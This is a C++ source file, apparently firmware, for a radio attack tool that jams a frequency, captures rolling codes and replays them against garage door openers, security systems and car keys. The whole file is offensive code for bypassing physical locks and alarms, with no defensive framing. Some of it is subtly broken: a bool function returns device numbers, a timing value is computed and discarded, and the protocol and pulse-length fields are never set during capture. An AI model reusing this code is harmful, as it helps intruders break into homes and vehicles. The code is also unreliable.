#include "SmartHomeAttack.h"

SmartHomeAttack::SmartHomeAttack(RFSignalProcessor *processor)
    : rfProcessor(processor), running(false) {}

bool SmartHomeAttack::start(const Config &config)
{
    if (running)
        return false;

    currentConfig = config;

    rfProcessor->setFrequency(config.frequency);
    rfProcessor->setBandwidth(config.bandwidth);

    if (config.activeJamming)
    {
        startJamming();
    }

    running = true;
    return true;
}

bool SmartHomeAttack::stop()
{
    if (!running)
        return false;

    if (currentConfig.activeJamming)
    {
        stopJamming();
    }

    running = false;
    return true;
}

bool SmartHomeAttack::isRunning() const
{
    return running;
}

const std::vector<SmartHomeAttack::CapturedCode> &SmartHomeAttack::getCapturedCodes() const
{
    return capturedCodes;
}

void SmartHomeAttack::processCapturedSignal()
{
    auto signal = rfProcessor->getCurrentSignal();
    if (isValidRollingCode(signal))
    {
        CapturedCode code;
        code.code = signal;
        code.timestamp = millis();
        code.signalStrength = rfProcessor->getSignalStrength();
        code.verified = verifyCapture(code);

        if (code.verified)
        {
            capturedCodes.push_back(code);
        }
    }
}

bool SmartHomeAttack::isValidRollingCode(const std::vector<uint8_t> &code)
{
    // Basic validation checks
    if (code.size() < 4 || code.size() > 32)
        return false;

    // Check for rolling code patterns
    bool hasSync = false;
    bool hasCounter = false;
    bool hasChecksum = false;

    // Look for sync pattern
    for (size_t i = 0; i < code.size() - 1; i++)
    {
        if (code[i] == 0xAA || code[i] == 0x55)
        {
            hasSync = true;
            break;
        }
    }

    // Look for counter pattern (incrementing/decrementing bytes)
    for (size_t i = 1; i < code.size(); i++)
    {
        if (abs(code[i] - code[i - 1]) == 1)
        {
            hasCounter = true;
            break;
        }
    }

    // Verify checksum if present
    uint8_t sum = 0;
    for (size_t i = 0; i < code.size() - 1; i++)
    {
        sum ^= code[i];
    }
    if (sum == code.back())
    {
        hasChecksum = true;
    }

    // Code needs to have at least 2 of these characteristics
    int validFeatures = hasSync + hasCounter + hasChecksum;
    return validFeatures >= 2;
}

void SmartHomeAttack::startJamming()
{
    // Configure jamming parameters
    rfProcessor->setJammingFrequency(currentConfig.frequency);
    rfProcessor->setJammingBandwidth(currentConfig.bandwidth);
    rfProcessor->startJamming();
}

void SmartHomeAttack::stopJamming()
{
    rfProcessor->stopJamming();
}

bool SmartHomeAttack::verifyCapture(const CapturedCode &code)
{
    // Signal strength check
    if (code.signalStrength < currentConfig.signalStrengthThreshold)
    {
        return false;
    }

    // Pulse length validation
    if (code.pulseLength < 100 || code.pulseLength > 5000)
    {
        return false;
    }

    // Verify timing consistency
    if (lastCaptureTime > 0)
    {
        uint32_t timeDiff = code.timestamp - lastCaptureTime;
        if (timeDiff < 100)
        { // Too close to last capture
            return false;
        }
    }

    return true;
}

bool SmartHomeAttack::detectDeviceType(const CapturedCode &code)
{
    // Pattern matching for known device types
    static const uint8_t GARAGE_DOOR_PATTERN[] = {0x55, 0xAA};
    static const uint8_t SECURITY_SYSTEM_PATTERN[] = {0xA5, 0x5A};
    static const uint8_t CAR_KEY_PATTERN[] = {0x33, 0xCC};

    // Check for garage door opener patterns
    if (code.code.size() >= 2)
    {
        if (memcmp(code.code.data(), GARAGE_DOOR_PATTERN, 2) == 0)
        {
            return 1; // Garage door
        }
        if (memcmp(code.code.data(), SECURITY_SYSTEM_PATTERN, 2) == 0)
        {
            return 2; // Security system
        }
        if (memcmp(code.code.data(), CAR_KEY_PATTERN, 2) == 0)
        {
            return 3; // Car key
        }
    }

    return 0; // Unknown device
}

void SmartHomeAttack::optimizeTransmitTiming(CapturedCode &code)
{
    // Calculate optimal timing based on signal analysis
    uint32_t bitPeriod = code.pulseLength;
    uint32_t guardTime = bitPeriod / 4;

    // Adjust for device type
    switch (code.protocol)
    {
    case 1: // Garage door
        guardTime = bitPeriod / 2;
        break;
    case 2: // Security system
        guardTime = bitPeriod / 3;
        break;
    case 3: // Car key
        guardTime = bitPeriod / 6;
        break;
    }

    // Store optimized timing
    code.pulseLength = bitPeriod;
}

bool SmartHomeAttack::filterDuplicates(const std::vector<uint8_t> &newCode)
{
    for (const auto &existing : capturedCodes)
    {
        if (existing.code == newCode)
        {
            // Consider timing between duplicates
            uint32_t timeSinceCapture = millis() - existing.timestamp;
            if (timeSinceCapture < currentConfig.captureWindow)
            {
                return true; // Duplicate within window
            }
        }
    }
    return false;
}

bool SmartHomeAttack::replayCode(size_t index)
{
    if (index >= capturedCodes.size())
        return false;

    const auto &code = capturedCodes[index];
    if (currentConfig.adaptiveTiming)
    {
        // Adjust timing based on original capture
        rfProcessor->setTransmitTiming(code.timestamp % 1000);
    }

    // Apply protocol-specific transmission settings
    switch (code.protocol)
    {
    case 1:                            // Garage door
        rfProcessor->setModulation(2); // FSK
        break;
    case 2:                            // Security system
        rfProcessor->setModulation(0); // OOK
        break;
    case 3:                            // Car key
        rfProcessor->setModulation(2); // FSK
        break;
    }

    return rfProcessor->transmitSignal(code.code);
}

bool SmartHomeAttack::replayAllCodes()
{
    bool success = true;
    for (size_t i = 0; i < capturedCodes.size(); i++)
    {
        if (!replayCode(i))
        {
            success = false;
        }
        delay(currentConfig.replayDelay);
    }
    return success;
}

float SmartHomeAttack::getSignalStrength() const
{
    return rfProcessor->getSignalStrength();
}
